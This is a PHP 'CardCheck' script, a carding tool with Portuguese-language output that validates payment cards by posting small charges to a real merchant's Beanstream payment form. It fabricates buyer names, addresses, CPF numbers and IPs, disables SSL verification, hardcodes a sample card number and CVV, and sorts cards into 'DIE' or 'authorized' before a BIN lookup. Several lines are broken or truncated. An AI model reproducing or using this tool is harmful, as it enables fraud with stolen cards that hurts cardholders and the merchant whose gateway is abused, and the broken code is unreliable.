<?php

function ExternalImport($public) {
    $external;
    if (filter_var($public, FILTER_VALIDATION_EMAIL)) {
        return true;
    } else {
        return false;
    }
}

function RandAll($panjang) {
    $pstring = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $plen = strlen($pstring);
    for ($i = 1; $i <= $panjang; $i++) {
        $start = rand(0, $plen);
        $unik.= substr($pstring, $start, 1);
    }

    return $unik;
}

function RandNum($panjang) {
    $unik = '';
    $pstring = "123456789";
    $plen = strlen($pstring);
    for ($i = 1; $i <= $panjang; $i++) {
        $start = rand(0, $plen);
        $unik.= substr($pstring, $start, 1);
    }

    return $unik;
}

function excluirArquivo() {
    if (file_exists("CardCheck_logs.txt")) {
        unlink("CardCheck_logs.txt");
    }
}

function CardCheck($card, $mes, $ano, $cvv) {

    if (file_exists(getcwd() . 'CardCheck_logs.txt')) {
        unlink(getcwd() . 'CardCheck_logs.txt');
    }
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }

    switch (substr($card, 0, 1)) {
        case '4':
            $typeCard = 1;
            $typeName = "Visa";
            break;
        case '5':
            $typeCard = 2;
            $typeName = "MasterCard";
            break;
        case '3':
            $typeCard = 3;
            $typeName = "ax";
            break;
    }

    switch ($mes) {
        case '1':
            $mes = '01';
            break;
        case '2':
            $mes = '02';
            break;
        case '3':
            $mes = '03';
            break;
        case '4':
            $mes = '04';
            break;
        case '5':
            $mes = '05';
            break;
        case '6':
            $mes = '06';
            break;
        case '7':
            $mes = '07';
            break;
        case '8':
            $mes = '08';
            break;
        case '9':
            $mes = '09';
            break;
        case '10':
            $mes = '10';
            break;
        case '11':
            $mes = '11';
            break;
        case '12':
            $mes = '12';
            break;
    }


    $name = array("Pennington", "Norman", "Stewart", "Cochran", "Humphrey", "Holmes", "Chase", "Chandler", "Hoffman", "Arias", "Manning", "Page", "Frost", "Mcguire", "Glass");
    $name = $name[rand(0, sizeof($name) - 1)];
    //last
    $lastname = array("Ayers", "Bryan", "Garner", "Rojas", "Gordon", "Tanner", "Juarez", "Jensen", "Oconnell", "Mason", "Whitaker", "Meyer", "Frey", "Mooney", "Salinaszz");
    $lastname = $lastname[rand(0, sizeof($lastname) - 1)];

    $zip = array("62934", "30329", "35404", "41042", "64163", "70001", "94520", "01608", "97218", "78476", "75217", "26206", "23123", "56523", "32112");
    $zip = $zip[rand(0, sizeof($zip) - 1)];

    $DateYear = array("1974", "1973", "1972", "1971", "1975", "1980", "1981", "1982", "1983", "1984", "1985", "1986", "1987", "1988", "1989", "1969", "1968");
    $DateYear = $DateYear[rand(0, sizeof($DateYear) - 1)];

    $DateMonth = array("1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12");
    $DateMonth = $DateMonth[rand(0, sizeof($DateMonth) - 1)];

    $Dateday = array("1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30");
    $Dateday = $Dateday[rand(0, sizeof($Dateday) - 1)];

    $genero = array("male", "female");
    $genero = $genero[rand(0, sizeof($genero) - 1)];


    $provedor_mail = array("gmail.com", "hotmail.com", "hotmail.com.br", "outlook.com", "bol.com.br", "yahoo.com.br", "imail.com.br", "mail.com", "yahoo.com");
    $provedor_mail = $provedor_mail[rand(0, sizeof($provedor_mail) - 1)];

    $street = array("3973 Ross Street", "3992 Flint Street", "2532 Broad Street", "4979 Mayo Street", "706 White Oak Drive", "1503 Shadowmar Drive", "2715 Thunder Road", "3017 Rockford Road", "3823 Washington Street", "2571 Heron Way", "618 Ersel Street", "134 Street Meyer", "Frey", "12 Jordon Mooney", "3205 Tavern Place");
    $street = $street[rand(0, sizeof($street) - 1)];
    //city
    $city = array("Leamington", "Atlanta", "Tuscaloosa", "Florence", "Ferrelview", "Metairie", "Concord", "Worcester", "Portland", "Corpus Christi", "Dallas", "Cowen", "Frey", "Jordon", "Tavern");
    $city = $city[rand(0, sizeof($city) - 1)];
    //zip
    $zip = array("62934", "30329", "35404", "41042", "64163", "70001", "94520", "01608", "97218", "78476", "75217", "26206", "23123", "56523", "32112");
    $zip = $zip[rand(0, sizeof($zip) - 1)];
    //state
    $state = array("AR", "AZ", "CA", "CO", "CT", "DC", "DE", "FL", "GA", "HI", "IA", "ID", "IL", "IN", "KS", "KY", "LA", "MA", "MD", "ME", "MI", "MN", "MO", "MS", "MT", "NC", "ND", "NE", "NH", "NJ", "NM", "NV", "NY", "OH", "OK", "OR", "PA", "RI", "SC", "SD", "TN", "TX", "UT", "VA", "VT", "WA", "WI", "WV", "WY", "AS", "FM", "GU", "MH", "MP", "PR", "PW", "VI", "AA", "AE", "AP", "AB", "BC", "MB", "NB", "NL", "NS", "NT", "NU", "ON");
    $state = $state[rand(0, sizeof($state) - 1)];

    $randProcuc = array("10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "29");
    $randProcuc = $randProcuc[rand(0, sizeof($randProcuc) - 1)];

    $randCPF = array("279.804.306-97", "287.834.545-27", "183.369.115-61", "797.683.894-60", "581.861.531-60", "680.744.263-78", "279.704.344-87", "573.838.329-06", "931.525.477-57", "766.701.013-76", "974.286.102-14", "926.529.562-72", "171.735.855-11", "185.302.491-00", "097.979.041-72", "120.848.671-34", "210.085.401-10", "281.064.341-00", "444.565.901-06", "647.603.671-87", "720.565.681-87", "471.431.341-04", "491.822.181-53", "084.528.651-04", "338.056.016-20", "645.697.568-91", "186.426.081-53", "380.921.231-87", "146.213.202-53", "115.231.071-20", "041.565.283-91", "214.658.511-00", "033.669.791-00", "417.494.641-87", "524.345.401-04", "351.428.201-34", "258.653.401-82", "563.489.161-20", "221.048.361-15", "324.830.401-44", "602.003.591-34", "249.148.351-34", "184.618.591-20", "941.394.158-00");
    $randCPF = $randCPF[rand(0, sizeof($randCPF) - 1)];

    $log_Username = RandAll('8') . '@' . $provedor_mail;
    $log_Password = RandAll('15');
    $log_login = RandAll('8');
    $sub_card1 = substr($card, 0, 4);
    $sub_card2 = substr($card, 4, 4);
    $sub_card3 = substr($card, 8, 4);
    $sub_card4 = substr($card, 12, 4);
    $group_card = $sub_card1 . '-' . $sub_card2 . '-' . $sub_card3 . '-' . $sub_card4 . '-';
    $sub_Ano = substr($ano, 2, 4);
    $group_mes = $mes;
    $group_ano = $sub_Ano;
    $group_cvv = $cvv;
    $group_zip = RandNum("5");
    $tel1 = RandNum("2");
    $tel2 = RandNum("4");
    $tel3 = RandNum("4");
    $tel4 = $tel1 . "" . $tel2 . "" . $tel3;
    $ip1 = RandNum("3");
    $ip2 = RandNum("3");
    $ip3 = RandNum("3");
    $ip4 = RandNum("3");
    $ip5 = $ip1 . "." . $ip2 . "." . $ip3 . "." . $ip4;
    $trnOrderNumber = RandNum('9');


    $ch = curl_init();
    //$urlPost = "https://www.beanstream.com/scripts/payment/payment.asp?merchant_id=117587301";
    $urlPost = "https://www.beanstream.com/scripts/process_transaction.as";
    
    //$post = "sessionToken=" . getSession() . "&paymentAction=&merchant_id=117587301&preview=&visaCheckoutCallId=&aDFinancingType=&aDPlanNumber=&aDGracePeriod=&aDTerm=&ordName=Mr+Lowan+Drye&ordPhoneNumber=%28216%29+801-4176&ordAddress1=+5784+Cozy+Embers+Walk&ordAddress2=&ordCity=Watertown&ordProvince=OH&ordPostalCode=45315-7116&ordCountry=US&ordEmailAddress=lodr%40freewebmail.com&shipName=&shipEmailAddress=&shipPhoneNumber=&shipAddress1=&shipAddress2=&shipCity=&shipProvince=&shipPostalCode=&shipCountry=&trnOrderNumber=$trnOrderNumber&trnAmount=3.00&paymentMethod=CC&trnCardOwner=Mr+Lowan+Drye&trnCardType=MC&trnCardNumber=$group_card&trnExpMonth=$group_mes&trnExpYear=$group_ano&trnCardCvd=$group_cvv&trnComments=";
    $post = "payFormParams='payment_type=PaymentForm&merchant_id=117587301&trnType=P&errorPage=%2Fscripts%2Fpayment%2Fpayment%2Easp&approvedPage=&declinedPage=&epe_client_found=false&trnLanguage=eng&shipping_method=&ref1=&ref2=&ref3=&ref4=&ref5=&shippingMethod=&deliveryEstimate=&ordTax1Price=&ordTax2Price=&ordItemPrice=0&ordShippingPrice=0&trnOrderNumber=22157717&trnAmount=3%2E00&ordName=Mr+Lowan+Drye&ordEmailAddress=lodr%40freewebmail%2Ecom&ordPhoneNumber=%28216%29+801%2D4176&ordAddress1=+5784+Cozy+Embers+Walk&ordCity=Watertown&ordProvince=OH&ordPostalCode=45315%2D7116&ordCountry=US&paymentMethod=CC&trnCardOwner=Mr+Lowan+Drye&trnCardCvd=958&cavBirthMonth=&cavBirthDay=&cavBirthYear=&cavSin=&paymentAction=&trnCardNumber=5512%2D3871%2D3216%2D8841%2D&trnExpMonth=09&trnExpYear=19&aDFinancingType=&aDPlanNumber=&aDGracePeriod=&aDTerm='";

    curl_setopt($ch, CURLINFO_HEADER_OUT, 1);
    curl_setopt($ch, CURLOPT_URL, $urlPost);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36'); // RADOM DOS NAVEGADORES
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIESESSION, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    curl_setopt($ch, CURLOPT_COOKIEJAR, '/CardCheck_logs.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/CardCheck_logs.txt');
    curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_REFERER, 'https://www.beanstream.com/scripts/payment/payment.asp?merchant_id=117587301');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $data = curl_exec($ch);
    $curl_headers = curl_getinfo ($ch , CURLINFO_HEADER_OUT);
    curl_close($ch);
    
    
    echo "<pre>";
    print_r($curl_headers);
    print_r($data);
    echo "</pre>";
    die();
    
    echo $data;


    if ($data) {
        if (preg_match("Transaction Declined", $data)) {
            echo "<div class='alert alert-danger' style='width: 80%;'> INFOCC: {$card}|{$mes}|{$ano}|{$cvv}  $   - DIE </div>";
        } elseif (preg_match("Transaction Declined", $data)) {
            echo "<div class='alert alert-danger' style='width: 80%;'> INFOCC : {$card}|{$mes}|{$ano}|{$cvv}  $  - DIE Cartao Nao suportado </div>";
        } elseif (preg_match("THANK YOU!", $data)) {

            $cc = substr($card, 0, 6);
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "http://www.binlist.net/json/$cc");
            curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $dadosSite = curl_exec($ch);
            $numerobin1 = explode('{"bin":"', $dadosSite);
            $numerobin2 = explode('",', $numerobin1[1]);
            $numerobin = $numerobin2[0];
            $banco1 = explode('"bank":"', $dadosSite);
            $banco2 = explode('",', $banco1[1]);
            $banco = $banco2[0];
            $banco = strtoupper($banco);
            $cartao1 = explode('"card_type":"', $dadosSite);
            $cartao2 = explode('",', $cartao1[1]);
            $cartaor = $cartao2[0];
            $cartao11 = explode('"card_category":"', $dadosSite);
            $cartao21 = explode('",', $cartao11[1]);
            $cartao123 = $cartao21[0];
            $cartao111 = explode('"country_name":"', $dadosSite);
            $cartao211 = explode('",', $cartao111[1]);
            $cartao1231 = $cartao211[0];
            $cartao1231 = strtoupper($cartao1231);
            $cartao1111 = explode('"brand":"', $dadosSite);
            $cartao2111 = explode('",', $cartao1111[1]);
            $cartao12311 = strtoupper($cartao12311);
            $info = "<font face='Tahoma' size='2' color='#FFD700'>" . $banco . '</font> |' . "<font face='Tahoma' size='2' color='#FF4500'>" . $cartao12311 . '</font>|' . "<font face='Tahoma' size='2' color='#FF00FF'>" . $cartaor . '</font>|' . "<font face='Tahoma' size='2' color='#7B68EE'>" . $cartao123 . '</font>|' . "<font face='Tahoma' size='2' color='#FF1493'>" . $cartao1231 . '</font>';
            $infos = $banco . '|' . $cartao12311 . '|' . $cartaor . '|' . $
                    $cartao12311 = $cartao2111[0];
            $cartao12311 = strtoupper($cartao12311);
            $info = "<font face='Tahoma' size='2' color='#FFD700'>" . $banco . '</font> |' . "<font face='Tahoma' size='2' color='#FF4500'>" . $cartao12311 . '</font>|' . "<font face='Tahoma' size='2' color='#FF00FF'>" . $cartaor . '</font>|' . "<font face='Tahoma' size='2' color='#7B68EE'>" . $cartao123 . '</font>|' . "<font face='Tahoma' size='2' color='#FF1493'>" . $cartao1231 . '</font>';
            $infos = $banco . '|' . $cartao12311 . '|' . $cartaor . '|' . $cartao123 . '|' . $cartao1231;


            echo "<div class='alert alert-success' style='width: 80%;'> Check : {$card}|{$mes}|{$ano}|{$cvv}: $info: - Resposta : Autorizado pelo banco emissor </div>";
        } else {
            echo "<div class='alert alert-danger' style='width: 80%;'> Check : {$card}|{$mes}|{$ano}|{$cvv}:  - Resposta : Codigo errado anta. </div>";
        }
    }
}

function getSession() {

    $ch = curl_init();
    $url = 'https://www.beanstream.com/scripts/payment/payment.asp?merchant_id=117587301';

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36'); // RADOM DOS NAVEGADORES
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIESESSION, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    curl_setopt($ch, CURLOPT_COOKIEJAR, '/CardCheck_logs.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/CardCheck_logs.txt');
    curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_POST, 0);
    curl_setopt($ch, CURLOPT_REFERER, $url);
    $data = curl_exec($ch);
    
    $logName = './session.log';
    file_put_contents($logName, $data);
    
    $file = fopen($logName,'r');
    
    while($linha = fgets($file)) {
        if ($pos = strpos($linha, 'sessionToken')) {
            $token = substr($linha, ($pos + 41), 32);
            return $token;
        }
    }
    
    die('Token não encontrado');
}
